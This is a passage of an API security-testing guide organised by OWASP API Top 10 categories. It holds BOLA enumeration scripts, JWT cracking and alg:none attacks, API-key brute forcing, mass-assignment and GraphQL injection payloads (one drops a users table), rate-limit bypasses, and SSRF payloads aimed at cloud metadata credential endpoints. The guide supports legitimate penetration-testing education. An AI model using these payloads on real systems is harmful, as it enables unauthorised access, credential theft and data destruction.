    """BOLA vulnerability test"""
    results = []
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    for uid in user_ids:
        resp = requests.get(f"{base_url}/api/users/{uid}", headers=headers)
        if resp.status_code == 200:
            results.append({
                "user_id": uid,
                "status": "BOLA - Accessible",
                "data_preview": resp.text[:100]
            })
    
    return results
```

---

## 3. API2 — Broken Authentication

```bash
# JWT vulnerability tests

# 1. JWT alg:none attack
# Modify header: {"alg":"none","typ":"JWT"}
# Remove signature

# 2. Weak secret key cracking
hashcat -a 0 -m 16500 jwt_token.txt rockyou.txt

# 3. JWT key confusion (RS256 → HS256)
# Sign with server's RSA public key as HMAC secret

# 4. JWT expiry not validated
# Modify exp claim to past date and send

# API Key brute force (rate limit check)
for key in $(cat api_keys.txt); do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "X-API-Key: $key" \
        https://api.target.com/v1/users)
    if [ "$response" = "200" ]; then
        echo "Valid API Key: $key"
    fi
done
```

---

## 4. API3 — Mass Assignment

Mass assignment occurs when API automatically binds all request body fields to model properties.

```bash
# Normal registration request
POST /api/register
{"username": "user1", "password": "pass123", "email": "user@example.com"}

# Mass assignment attack — add admin or role field
POST /api/register
{"username": "attacker", "password": "pass", "email": "a@a.com", "role": "admin"}

# Or in profile update
PUT /api/users/profile
{"name": "Test", "isAdmin": true, "balance": 999999}

# Discovery method: check API docs, JS files, error messages
curl -s https://api.target.com/api/docs | grep -i "schema\|properties\|model"
```

---

## 5. API4 — Rate Limit Testing

```python
import requests
import time
from concurrent.futures import ThreadPoolExecutor

def test_rate_limit(url: str, token: str, requests_count: int = 100) -> dict:
    """Rate limit vulnerability test"""
    
    headers = {"Authorization": f"Bearer {token}"}
    results = {"success": 0, "rate_limited": 0, "errors": 0}
    
    def send_request(_):
        try:
            resp = requests.post(url, headers=headers, json={"otp": "123456"}, timeout=5)
            if resp.status_code == 200:
                results["success"] += 1
            elif resp.status_code == 429:
                results["rate_limited"] += 1
            else:
                results["errors"] += 1
        except:
            results["errors"] += 1
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(send_request, range(requests_count))
    
    return results

# Rate limit bypass techniques:
# X-Forwarded-For: 1.2.3.4 (change per request)
# X-Real-IP header rotation
# Null byte in path: /api/login%00
```

---

## 6. API7 — SSRF Testing

```bash
# Basic SSRF test
POST /api/webhook
{"url": "http://169.254.169.254/latest/meta-data/"}  # AWS metadata

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://169.254.169.254/metadata/v1/  # Azure

# SSRF bypass techniques
http://127.0.0.1/admin           # direct
http://[::1]/admin               # IPv6
http://0x7f000001/admin          # hex
http://017700000001/admin        # octal
http://127.1/admin               # short form

# Blind SSRF (DNS callback)
{"url": "http://your-burp-collaborator.com/ssrf-test"}
```

---

## 7. GraphQL Security Testing

```bash
# Introspection query (schema extraction)
POST /graphql
{
  "query": "{ __schema { types { name fields { name } } } }"
}

# Disable introspection check
POST /graphql
{"query": "{__schema{types{name}}}"}

# GraphQL injection
{"query": "{ user(id: \"1; DROP TABLE users--\") { name } }"}

# Batching attack (rate limit bypass)
POST /graphql
[
  {"query": "mutation { login(user: \"admin\", pass: \"pass1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"pass2\") { token } }"}
]
```

---

## 8. API Security Testing Tools

```bash
# Postman — API testing
# Import OpenAPI/Swagger spec → auto-generate test cases

# Insomnia — REST/GraphQL client

# kiterunner — API endpoint discovery
kr scan https://api.target.com -w routes-large.kite

# Arjun — hidden parameter discovery
arjun -u https://api.target.com/endpoint

# APIKit (Burp extension) — API security testing
```

---

## 9. Automation Script

```python
#!/usr/bin/env python3
"""
API Security Testing Automation Script
Tests OWASP API Top 10 vulnerabilities
"""
import requests
import json
from typing import Optional

class APISecurityTester:
    def __init__(self, base_url: str, auth_token: Optional[str] = None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        if auth_token:
            self.session.headers['Authorization'] = f'Bearer {auth_token}'
        self.findings = []
    
    def test_bola(self, endpoint: str, id_range: range) -> list:
        """BOLA/IDOR test"""
        vulnerable = []
        for obj_id in id_range:
            resp = self.session.get(f"{self.base_url}{endpoint}/{obj_id}")
            if resp.status_code == 200:
                vulnerable.append({
                    "id": obj_id,
                    "url": f"{self.base_url}{endpoint}/{obj_id}",
                    "type": "BOLA"
                })
        return vulnerable
    
    def test_mass_assignment(self, endpoint: str, 
                              base_data: dict, 
                              extra_fields: dict) -> dict:
        """Mass assignment test"""
        payload = {**base_data, **extra_fields}
        resp = self.session.post(f"{self.base_url}{endpoint}", json=payload)
        return {
            "endpoint": endpoint,
            "payload": payload,
            "status": resp.status_code,
            "response": resp.text[:200]
        }
    
    def generate_report(self) -> str:
        """Generate test results report"""
        report = f"# API Security Test Report\n\n"
        report += f"Target: {self.base_url}\n"
        report += f"Total Findings: {len(self.findings)}\n\n"
        
        for finding in self.findings:
            report += f"## [{finding.get('severity', 'MEDIUM')}] {finding.get('type')}\n"
            report += f"URL: {finding.get('url')}\n"
            report += f"Details: {finding.get('details')}\n\n"
        
        return report
```

---

## 10. CVSS Score Calculation Examples

| Vulnerability | Attack Vector | Complexity | Privileges | User Interaction | CVSS |
|--------------|--------------|-----------|-----------|-----------------|------|
| BOLA | Network | Low | Low | None | **7.5** High |
| Mass Assignment | Network | Low | Low | None | **8.8** High |
| SSRF (AWS Metadata) | Network | Low | Low | None | **9.8** Critical |
| JWT alg:none | Network | Low | None | None | **9.1** Critical |
| Rate Limit OTP | Network | Low | None | None | **7.3** High |
